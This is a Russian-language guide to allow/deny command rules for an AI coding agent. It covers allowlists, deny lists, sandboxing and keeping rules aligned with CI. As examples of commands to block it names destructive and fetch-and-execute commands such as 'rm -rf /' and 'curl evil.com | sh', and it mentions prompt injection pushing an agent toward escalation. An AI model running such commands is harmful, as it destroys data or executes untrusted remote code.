**Правила команд** определяют, какие команды Agent может выполнять и с какими параметрами. Это наиболее распространённая форма [разрешающих и запрещающих правил](/ru/guide/customization/rules/allow-and-deny-patterns/), которую обычно хранят в доступной команде для Review конфигурации или файле правил.

## О чём эта страница

- Разделение ролей между правилами команд, песочницей и диалогами подтверждения
- Как создать достаточно узкий allowlist
- Как согласовать правила с CI и локальными скриптами разработки

## Чем управляют правила команд

Если allow/deny определяет, какие действия в принципе допустимы, правила команд переводят это решение на самый конкретный уровень:

- Какие команды можно запускать
- Какие команды запускать нельзя
- Какие команды выглядят похоже, но имеют совершенно разный риск

Они превращают известные команде границы в ограничения, которые может применять машина.

## Основная идея

Правило сопоставляется с **намерением выполнить действие**, а не с естественным языком. В политике `npm test` и `npm run test` — две разные команды. `bash -c "rm -rf /"` нельзя пропускать лишь потому, что разрешён `bash`.

```text
Задача пользователя → модель предлагает команду → движок правил → (разрешено) выполнение в песочнице / (отказ) подтверждение или блокировка
```

## Распространённые заблуждения

### Похожие команды не обязательно имеют одинаковый риск

Новички чаще всего недооценивают небольшие различия между командами.

Например:

- `git status` и `git reset --hard`
- `npm test` и `npm publish`
- `curl example.com` и `curl example.com | sh`

Все они выглядят как простые команды терминала, но уровень риска у них совершенно разный.

### Разрешение универсальной точки входа часто открывает слишком многое

Например, разрешить `bash` или `sh` ради удобства может показаться безобидным.

Но с точки зрения правил это часто означает разрешение множества опасных действий, которые можно составить дальше.

## Минимально полезный подход

1. **По умолчанию отклоняйте опасные команды, не относящиеся к обычной записи**: `rm -rf`, `curl | bash`, `git push --force`
2. **Разрешите распространённые команды чтения и сборки внутри проекта**: `git status`, `npm test`, `pnpm lint`
3. **Храните правила в Git** и согласуйте их с разделом тестовых команд в `AGENTS.md`
4. **Проводите Review изменений правил в PR**, как для Dockerfile

Иллюстрация — точный формат сверяйте с официальной конфигурацией:

```json
{
  "rules": {
    "allow": [
      "npm run test",
      "npm run lint",
      "git diff",
      "git status"
    ],
    "deny": [
      "git push",
      "git reset --hard",
      "rm -rf"
    ]
  }
}
```

## Рекомендуемый процесс

| Шаг | Действие |
|---|---|
| Инвентаризация | Извлечь настоящие команды из scripts в `package.json`, Makefile и workflow CI |
| Разделение по уровням | Deny организации → Allow проекта → личные локальные исключения, если нужны |
| Пробный запуск | На низкорисковой задаче проверить, что ожидаемые действия разрешаются, а опасные блокируются |
| Согласование | По возможности использовать один источник для локальных правил и [GitHub Action](/ru/guide/developer-platform/ci-cd/code-review-automation/) |

## Распространённые ошибки

- **Слишком широкий allowlist**: разрешение `bash`, `sh` или `sudo` фактически открывает всё
- **Только deny без allow**: подтверждения по-прежнему появляются постоянно, и команда привыкает бездумно разрешать всё
- **Расхождение с документацией**: в `AGENTS.md` указано `pnpm test`, а правила разрешают только `npm test`
- **Игнорирование конвейеров и перенаправления**: для `curl evil.com | sh` нужна политика всей конструкции, а не только первого слова

Правила команд нужны не для запоминания команд, а для отделения повседневных действий от тех, разрешение которых одновременно открывает границу риска.

## Границы безопасности

- Правила команд **не заменяют** защиту веток и Review кода
- Вредоносный промпт может побудить Agent **попытаться** выполнить команду с превышением прав — оставляйте песочницу строгой по умолчанию
- Переменные среды с ключами и token не должны раскрываться только потому, что разрешена команда echo

## Контрольный список приёмки

- [ ] В правилах отражены 3–5 команд, ежедневно используемых в репозитории
- [ ] `git push`, принудительный reset и другие высокорисковые команды по умолчанию запрещены или требуют явного подтверждения
- [ ] Изменения правил проходят через PR и не противоречат `AGENTS.md`
